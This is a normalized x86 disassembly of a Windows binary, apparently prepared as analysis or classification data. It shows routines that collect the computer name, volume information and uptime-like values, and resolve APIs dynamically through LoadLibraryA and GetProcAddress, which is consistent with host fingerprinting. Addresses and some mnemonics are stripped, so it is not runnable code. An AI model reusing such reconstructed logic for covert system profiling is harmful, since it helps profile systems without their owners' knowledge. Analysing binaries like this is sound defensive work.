jmp r-xdata
sub_402290
push 0xffffffff
push sub_4104c2
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x14 ] esi
mov [ esi ] r--data
mov [ esp + 0x28 ] 0x5
call sub_406b80
mov ecx esi
call sub_406bf0
mov ebp [ esi + 0x68 ]
lea edi [ esi + 0x64 ]
xor ebx ebx
mov [ esp + 0x28 ] 0x4
mov eax [ ebp ]
cmp eax ebp
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_408e5f
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov ebp [ esi + 0x5c ]
lea edi [ esi + 0x58 ]
add esp 0x4
mov [ esp + 0x28 ] 0x3
mov eax [ ebp ]
cmp eax ebp
mov [ esp + 0x10 ] eax
je r-xdata
lea eax [ esp + 0x18 ]
push ebx
push eax
lea ecx [ esp + 0x18 ]
call sub_4042d0
mov ecx [ eax ]
lea edx [ esp + 0x1c ]
push ecx
push edx
mov ecx edi
call sub_404290
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ edi + 0x4 ]
push eax
call sub_408e5f
add esp 0x4
lea ecx [ esi + 0x40 ]
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
push 0x1
mov [ esp + 0x2c ] 0x2
call sub_404100
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x1c ]
push ebx
push eax
lea ecx [ esp + 0x18 ]
call sub_4042d0
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push ecx
push edx
mov ecx edi
call sub_404290
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov eax [ esi + 0x24 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_402410
mov eax 0x8854
call sub_408e30
mov eax [ esp + 0x8860 ]
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
mov [ esp + 0x3c ] eax
mov ecx [ esi + 0x28 ]
call [ ecx + 0x12f8 ]
mov edx [ esi + 0x24 ]
mov [ esp + 0x28 ] eax
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x40 ]
mov [ esp + 0x24 ] edx
[ edi ]
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x40 ]
push eax
push ecx
mov [ esp + 0x28 ] 0x20
call [ GetComputerNameW@IAT ]
mov edx [ esi + 0x28 ]
lea eax [ esp + 0xa8 ]
push eax
mov [ esp + 0xac ] 0x9c
call [ edx + 0x1300 ]
mov edx [ esp + 0xb0 ]
mov ecx [ esp + 0xac ]
mov eax [ esp + 0x13c ]
mov [ esp + 0x34 ] edx
mov [ esp + 0x30 ] ecx
mov ecx [ esi + 0x28 ]
lea edx [ esp + 0x244 ]
and eax 0xffff
push 0x80
push edx
mov [ esp + 0x40 ] eax
call [ ecx + 0x1598 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov eax [ esi + 0x28 ]
lea ecx [ esp + 0x244 ]
push ecx
call [ eax + 0x1590 ]
jmp r-xdata
mov ecx [ esi + 0x28 ]
push 0x100
lea edx [ esp + 0x148 ]
push rw-data
push edx
mov [ esp + 0x20 ] 0x0
call [ ecx + 0x1344 ]
mov cl [ esp + 0x144 ]
mov [ esp + 0x243 ] 0x0
cmp cl 0x3a
lea eax [ esp + 0x144 ]
je r-xdata
mov edi [ ebx + 0x4 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov esi [ esp + 0x10 ]
mov [ ebx + 0x8 ] ebp
mov [ eax + ebp ] 0x0
mov edx [ eax + 0xc ]
mov edi rw-data
mov ebx [ esp + 0x8868 ]
push 0x1
mov eax [ edx ]
mov ecx [ eax ]
xor eax eax
mov [ esp + 0x30 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov ebp ecx
mov ecx ebx
push ebp
call sub_404170
test al al
je r-xdata
cmp [ eax ] 0x3a
jne r-xdata
test cl cl
je r-xdata
mov eax [ esi + 0x28 ]
lea ecx [ esp + 0x144 ]
push ecx
call [ eax + 0x1590 ]
mov edi eax
test edi edi
je r-xdata
mov [ eax ] 0x0
inc eax
mov [ esp + 0x14 ] eax
mov cl [ eax + 0x1 ]
inc eax
cmp cl 0x3a
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ ebx + 0x8 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
movsx eax [ edi + 0xa ]
cdq
and edx 0x3
xor esi esi
add eax edx
sar eax 0x2
test eax eax
jle r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
lea edi [ esp + 0x80 ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebx + 0x8 ]
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx esi
ja r-xdata
mov edx [ edi + 0xc ]
mov ecx [ esp + 0x10 ]
mov eax [ edx + esi * 4 ]
mov edx [ ecx + 0x28 ]
xor ecx ecx
mov cl [ eax + 0x3 ]
push ecx
xor ecx ecx
mov cl [ eax + 0x2 ]
push ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
push ecx
xor ecx ecx
mov cl [ eax ]
lea eax [ esp + 0x8c ]
push ecx
push rw-data
push eax
call [ edx + 0x14dc ]
movsx eax [ edi + 0xa ]
cdq
and edx 0x3
add esp 0x18
add eax edx
inc esi
sar eax 0x2
cmp esi eax
jl r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x886c ]
[ edi ]
not ecx
dec ecx
push 0x1
mov esi ecx
mov ecx ebp
push esi
mov [ esp + 0x18 ] esi
call sub_404170
test al al
je r-xdata
mov ebp [ ebx + 0x8 ]
push 0x0
add ebp esi
mov ecx ebx
push ebp
call sub_404170
test al al
je r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
lea ecx [ esp + 0x4c4 ]
call sub_404fc0
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x18 ]
push edx
push eax
lea ecx [ esp + 0x2c ]
push 0x5c
push ecx
lea ecx [ esp + 0x4d4 ]
call sub_405ea0
mov edi [ ebx + 0x4 ]
test edi edi
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx esi
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ecx + eax ] 0x0
mov ecx esi
mov esi rw-data
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov ebp [ ebx + 0x8 ]
push 0x0
add ebp esi
mov ecx ebx
push ebp
call sub_404170
test al al
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x3c4 ]
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x2c4 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
push ecx
push edx
push eax
call sub_401120
add esp 0xc
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x4c8 ]
call sub_405f80
lea edi [ esp + 0x2c4 ]
or ecx 0xffffffff
xor eax eax
mov edx [ r--data ]
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ ebp + 0x8 ]
sub edx ecx
cmp edx esi
ja r-xdata
mov edi r--data
mov eax [ r--data ]
mov edx [ ebx + 0x8 ]
sub eax edx
cmp eax 0x1
ja r-xdata
mov edi [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov ecx esi
add edi edx
mov edx ecx
lea esi [ esp + 0x80 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_404150
test esi esi
jbe r-xdata
call sub_40fc40
mov esi [ ebx + 0x8 ]
push 0x0
inc esi
mov ecx ebx
push esi
call sub_404170
test al al
je r-xdata
call sub_40fc40
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ r--data ]
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ ebp + 0x8 ]
sub edx ecx
cmp edx esi
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov eax esi
add eax ecx
push 0x0
push eax
mov ecx ebp
mov [ esp + 0x18 ] eax
call sub_404170
test al al
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edx [ ebx + 0x8 ]
not ecx
dec ecx
mov esi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx esi
ja r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
add eax ecx
push esi
mov ecx ebx
mov [ eax ] 0x3a
call sub_404150
test esi esi
jbe r-xdata
call sub_40fc40
mov edi [ ebp + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx esi
add edi eax
mov eax ecx
lea esi [ esp + 0x2c4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ecx + eax ] 0x0
test esi esi
jbe r-xdata
call sub_40fc40
mov ecx [ r--data ]
mov eax [ ebp + 0x8 ]
mov edi ecx
cmp eax edi
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax esi
add eax ecx
push 0x0
push eax
mov ecx ebp
mov [ esp + 0x18 ] eax
call sub_404170
test al al
je r-xdata
mov ebp [ ebx + 0x8 ]
push 0x0
add ebp esi
mov ecx ebx
push ebp
call sub_404170
test al al
je r-xdata
sub ecx [ ebx + 0x8 ]
cmp ecx edi
ja r-xdata
mov edi eax
mov edi [ ebp + 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx esi
add edi eax
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ecx + eax ] 0x0
mov ecx esi
mov esi [ esp + 0x14 ]
jmp r-xdata
test edi edi
jbe r-xdata
call sub_40fc40
mov edi [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_404150
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x8854
retn 0xc
mov eax [ ebx + 0x8 ]
push 0x0
add eax edi
mov ecx ebx
push eax
mov [ esp + 0x18 ] eax
call sub_404170
test al al
je r-xdata
mov ebp [ ebp + 0x4 ]
mov esi r--data
test ebp ebp
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx edi
mov edi [ ebx + 0x8 ]
mov edx ecx
add edi eax
mov eax [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov [ eax + ecx ] 0x0
mov esi ebp
sub_402980
sub esp 0x104
lea eax [ esp ]
push esi
push 0x104
mov esi ecx
push eax
call [ FindFirstVolumeA@IAT ]
cmp eax 0xffffffff
je r-xdata
pop esi
add esp 0x104
retn
push 0xa
push 0x0
push 0x0
add esi 0x24
push 0x0
push esi
push 0xc
lea ecx [ esp + 0x1c ]
push 0x0
push ecx
call [ GetVolumeInformationA@IAT ]
sub_4029d0
mov eax [ esp + 0x4 ]
mov edx [ eax + 0xc ]
dec edx
cmp edx 0x5
ja r-xdata
mov al 0x1
retn 0x4
jmp [ edx * 4 + jump_table_402a20 ]
push eax
mov eax [ ecx + 0x28 ]
push ecx
push eax
call sub_4018e0
add esp 0xc
mov al 0x1
retn 0x4
push eax
push ecx
mov ecx [ ecx + 0x28 ]
push ecx
call sub_402ef0
add esp 0xc
mov al 0x1
retn 0x4
mov edx [ ecx + 0x28 ]
push eax
push ecx
push edx
call sub_404f40
add esp 0xc
sub_402a40
push esi
mov esi [ esp + 0xc ]
test esi esi
je r-xdata
xor al al
pop esi
retn 0xc
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
cmp [ edx ] 0x0
je r-xdata
mov al 0x1
pop esi
retn 0xc
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
mov [ esi ] edx
[ edi ]
not ecx
dec ecx
add esi 0x4
mov al [ edx + ecx + 0x1 ]
lea edx [ edx + ecx + 0x1 ]
test al al
jne r-xdata
pop edi
sub_402a90
sub esp 0x18
push ebx
mov ebx [ esp + 0x20 ]
push ebp
push esi
test ebx ebx
push edi
mov [ esp + 0x14 ] ecx
jne r-xdata
lea eax [ ebx + 0x20 ]
mov ecx 0x384
mov esi rw-data
mov edi eax
lea edx [ ebx + 0x15e8 ]
mov [ ebx + 0x8 ] 0x1
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
push eax
push edx
push ebx
lea ebp [ ebx + 0x1230 ]
call sub_402a40
mov ecx [ GetProcAddress@IAT ]
lea eax [ ebx + 0x15e8 ]
mov [ esp + 0x14 ] eax
add eax 0x10
mov [ esp + 0x10 ] eax
mov eax [ LoadLibraryA@IAT ]
mov [ esp + 0x18 ] 0x73
mov [ esp + 0x1c ] 0x39
mov [ esp + 0x20 ] 0x28
mov [ esp + 0x24 ] 0x1a
mov [ esp + 0x2c ] ebp
mov [ ebp + 0xc ] eax
mov [ ebp ] ecx
xor esi esi
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x18
retn 0x4
mov eax [ esp + esi * 4 + 0x18 ]
xor edi edi
test eax eax
jle r-xdata
mov edx [ esp + 0x14 ]
add edx 0x4
inc esi
cmp esi 0x4
mov [ esp + 0x14 ] edx
jl r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ebx + esi * 4 + 0x10 ]
mov edx [ ecx ]
push edx
push eax
call [ ebp ]
mov ecx [ esp + 0x2c ]
test eax eax
mov [ ecx ] eax
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ edx ]
push eax
call [ ebp + 0xc ]
test eax eax
mov [ ebx + esi * 4 + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
add esp 0x18
retn 0x4
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x10 ]
mov eax 0x4
add ecx eax
add edx eax
mov eax [ esp + esi * 4 + 0x18 ]
inc edi
cmp edi eax
mov [ esp + 0x2c ] ecx
mov [ esp + 0x10 ] edx
jl r-xdata
test esi esi
jne r-xdata
cmp edi 0x6d
jl r-xdata
cmp edi 0x36
jne r-xdata
cmp edi 0x72
jg r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
sub_402bd0
push 0xffffffff
push sub_410588
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xa0
mov al [ esp + 0x4 ]
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
push ebx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x50 ] al
call sub_404100
lea ecx [ esp + 0x10 ]
mov [ esp + 0xb4 ] ebx
push ecx
lea ecx [ esp + 0x60 ]
call sub_404020
lea edx [ esp + 0x16 ]
lea ecx [ esp + 0x6c ]
push edx
mov [ esp + 0xb8 ] 0x1
call sub_404020
lea eax [ esp + 0x15 ]
lea ecx [ esp + 0x7c ]
push eax
mov [ esp + 0xb8 ] 0x2
call sub_404020
lea ecx [ esp + 0x13 ]
mov [ esp + 0xb4 ] 0x3
push ecx
lea ecx [ esp + 0x98 ]
call sub_404080
lea edx [ esp + 0xf ]
lea ecx [ esp + 0xa0 ]
push edx
mov [ esp + 0xb8 ] 0x4
call sub_404080
mov [ esp + 0x3c ] r--data
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
push 0x70
mov [ esp + 0xb8 ] 0x5
call sub_408e6a
mov esi eax
add esp 0x4
mov [ esp + 0x38 ] esi
cmp esi ebx
mov [ esp + 0xb4 ] 0x6
je r-xdata
mov al [ esp + 0xe ]
push ebx
lea ecx [ esp + 0x1c ]
mov [ esp + 0xb8 ] 0x5
mov [ esp + 0x1c ] al
call sub_404100
mov cl [ esp + 0xe ]
push ebx
mov [ esp + 0x2c ] cl
lea ecx [ esp + 0x2c ]
mov [ esp + 0xb8 ] 0xc
call sub_404100
lea edx [ esp + 0x28 ]
push ebx
lea eax [ esp + 0x1c ]
push edx
push eax
mov ecx edi
mov [ esp + 0xc0 ] 0xd
call sub_402410
mov eax [ esp + 0x1c ]
cmp eax ebx
jne r-xdata
mov al [ esp + 0xf ]
lea ecx [ esi + 0x10 ]
push ebx
mov [ ecx ] al
call sub_404100
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb4 ] 0x7
push ecx
lea ecx [ esi + 0x20 ]
call sub_404020
lea edx [ esp + 0x11 ]
lea ecx [ esi + 0x30 ]
push edx
mov [ esp + 0xb8 ] 0x8
call sub_404020
lea eax [ esp + 0x17 ]
lea ecx [ esi + 0x40 ]
push eax
mov [ esp + 0xb8 ] 0x9
call sub_404020
lea ecx [ esp + 0x12 ]
mov [ esp + 0xb4 ] 0xa
push ecx
lea ecx [ esi + 0x58 ]
call sub_404080
lea edx [ esp + 0xe ]
lea ecx [ esi + 0x64 ]
push edx
mov [ esp + 0xb8 ] 0xb
call sub_404080
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
push rw-data
push ebx
push ebx
push eax
lea ecx [ esp + 0x4c ]
call sub_4060a0
test al al
je r-xdata
mov eax r--data
push 0x1
lea ecx [ esp + 0x2c ]
mov [ esp + 0xb8 ] 0xc
call sub_404100
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0xbc ]
mov ecx [ esp + 0x2c ]
cmp ecx ebx
mov edx [ eax ]
mov eax [ eax + 0x4 ]
jne r-xdata
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x3c ] r--data
lea ecx [ esp + 0x3c ]
mov [ esp + 0xb4 ] 0x13
call sub_406b80
lea ecx [ esp + 0x3c ]
call sub_406bf0
lea ecx [ esp + 0xa0 ]
mov [ esp + 0xb4 ] 0x12
call sub_4040b0
lea ecx [ esp + 0x94 ]
mov [ esp + 0xb4 ] 0x11
call sub_4040b0
push 0x1
lea ecx [ esp + 0x80 ]
mov [ esp + 0xb8 ] 0x10
call sub_404100
push 0x1
lea ecx [ esp + 0x70 ]
mov [ esp + 0xb8 ] 0xf
call sub_404100
push 0x1
lea ecx [ esp + 0x60 ]
mov [ esp + 0xb8 ] 0xe
call sub_404100
push 0x1
lea ecx [ esp + 0x50 ]
mov [ esp + 0xb8 ] 0xffffffff
call sub_404100
mov ecx [ esp + 0xac ]
pop edi
pop esi
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xac
retn 0x4
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ebx
push edx
push eax
push 0x1
push ecx
lea ecx [ esp + 0x50 ]
call sub_406700
lea ecx [ esp + 0x3c ]
call sub_4066d0
mov ecx r--data
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_402ef0
push 0xffffffff
push sub_4105b6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c8
mov al [ esp + 0x2b ]
push ebx
push ebp
push esi
xor esi esi
push edi
mov [ esp + 0x10 ] al
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov ebp [ esp + 0x5e8 ]
lea ecx [ esp + 0x3c ]
lea edx [ esp + 0x3d8 ]
push ecx
push edx
mov [ esp + 0x5e8 ] esi
mov [ esp + 0x44 ] 0x10
call [ ebp + 0x129c ]
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0x3c ]
lea edx [ esp + 0x3d8 ]
push ecx
push edx
mov [ esp + 0x44 ] 0x200
call [ ebp + 0x14e0 ]
cmp eax 0x1
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov edi ecx
cmp eax edi
ja r-xdata
call [ ebp + 0x12f8 ]
mov ecx eax
mov eax 0x31b5d43b
mul ecx
mov ebx edx
mov esi ecx
shr ebx 0x18
mov edi rw-data
lea eax [ ebx + ebx * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 8 ]
mov eax 0x95217cb1
shl edx 0x7
sub esi edx
mul esi
shr edx 0x15
mov [ esp + 0x40 ] edx
lea eax [ edx + ebx ]
mov edx ecx
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea esi [ eax + eax * 4 ]
mov eax 0x45e7b273
lea esi [ esi + esi * 8 ]
shl esi 0x7
sub edx esi
mul edx
shr edx 0xe
mov [ esp + 0x4c ] edx
imul edx edx 0xea60
sub ecx edx
mov eax 0x10624dd3
sub ecx esi
mul ecx
or ecx 0xffffffff
xor eax eax
shr edx 0x6
[ edi ]
mov eax [ r--data ]
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x18 ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
cmp edi esi
jbe r-xdata
call sub_40fc40
test esi esi
jbe r-xdata
call sub_40fc40
test esi esi
jbe r-xdata
call sub_40fc40
lea edi [ esp + 0x3d8 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
not ecx
dec ecx
mov edi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx edi
ja r-xdata
mov ecx [ esp + 0x18 ]
push esi
lea ebx [ ecx + edi ]
lea ecx [ esp + 0x14 ]
push ebx
call sub_404170
test al al
je r-xdata
lea edi [ esp + 0x3d8 ]
or ecx 0xffffffff
xor eax eax
mov edx [ r--data ]
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ esp + 0x18 ]
sub edx ecx
cmp edx esi
ja r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
lea eax [ ecx + esi ]
lea ecx [ esp + 0x14 ]
push eax
mov [ esp + 0x2c ] eax
call sub_404170
test al al
je r-xdata
lea edi [ esp + 0x3d8 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx esi
ja r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x14 ]
push ebx
call sub_404170
test al al
je r-xdata
cmp edi esi
jbe r-xdata
call sub_40fc40
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx edi
add eax edx
mov edx ecx
mov esi rw-data
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
xor esi esi
mov [ eax + ebx ] 0x0
test esi esi
jbe r-xdata
call sub_40fc40
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx esi
mov esi rw-data
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x24 ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov [ ecx + eax ] 0x0
test esi esi
jbe r-xdata
call sub_40fc40
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx esi
mov esi rw-data
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
mov [ eax + ebx ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov edi ecx
cmp eax edi
ja r-xdata
mov edx [ esp + 0x18 ]
push esi
lea ecx [ esp + 0x14 ]
lea ebx [ edx + edi ]
push ebx
call sub_404170
test al al
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov eax [ esp + 0x18 ]
push 0x0
add eax esi
lea ecx [ esp + 0x14 ]
push eax
mov [ esp + 0x2c ] eax
call sub_404170
test al al
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x18 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov edx [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x14 ]
lea ebx [ edx + esi ]
push ebx
call sub_404170
test al al
je r-xdata
cmp edi esi
jbe r-xdata
call sub_40fc40
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
add eax ecx
mov ecx edi
mov edx ecx
lea esi [ esp + 0x3d8 ]
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
xor esi esi
mov [ eax + ebx ] 0x0
test esi esi
jbe r-xdata
call sub_40fc40
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
lea edi [ edx + ecx ]
mov ecx esi
mov eax ecx
lea esi [ esp + 0x3d8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x24 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov [ ecx + eax ] 0x0
test esi esi
jbe r-xdata
call sub_40fc40
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
lea edi [ ecx + eax ]
mov ecx esi
mov edx ecx
lea esi [ esp + 0x3d8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x18 ] ebx
mov [ eax + ebx ] 0x0
mov ecx [ esp + 0x18 ]
push esi
lea ebx [ ecx + edi ]
lea ecx [ esp + 0x14 ]
push ebx
call sub_404170
test al al
je r-xdata
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x40 ]
push edx
push eax
push ecx
push ebx
lea edx [ esp + 0x14c ]
push rw-data
push edx
call [ ebp + 0x14dc ]
lea edi [ esp + 0x154 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
mov edx [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x14 ]
lea eax [ edx + esi ]
push eax
mov [ esp + 0x2c ] eax
call sub_404170
test al al
je r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
lea ebx [ ecx + esi ]
lea ecx [ esp + 0x14 ]
push ebx
call sub_404170
test al al
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov ecx edi
add eax edx
mov edx ecx
mov esi rw-data
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x14 ]
